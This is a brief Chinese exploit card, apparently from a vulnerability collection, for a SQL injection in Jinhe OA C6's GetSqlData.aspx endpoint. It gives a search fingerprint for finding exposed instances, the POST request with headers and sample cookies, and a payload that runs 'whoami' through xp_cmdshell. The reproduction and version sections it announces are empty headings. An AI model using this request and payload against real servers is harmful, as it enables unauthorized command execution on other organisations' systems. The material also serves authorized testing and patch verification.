# 金和OAC6GetSqlData.aspxSQL注入漏洞

- **系统**：金和OA　|　**类型**：SQL注入　|　**CVE**：—
- **指纹**：`app.name="金和 OA"`
- **请求**：`POST /C6/Control/GetSqlData.aspx/.ashx HTTP/1.1`
- **关键头**：`Host: xx.xx.xx.xx`　`Cookie: ASPSESSIONIDQSBDARRR=NOCLHBADNKFGJHMCBFLJKKNG; ASP.NET_SessionId=blm2e03jfo1yvd0…`　`Content-Type: application/x-www-form-urlencoded`　`Content-Length: 33`

**请求体 / payload**
```
exec master..xp_cmdshell 'whoami'
```

**其他**
- 金和OA C6 GetSqlData.aspx SQL注入漏洞: * 一、漏洞简介
* 二、影响版本
* 三、资产测绘
* 四、漏洞复现
***
- 版本: * 金和OA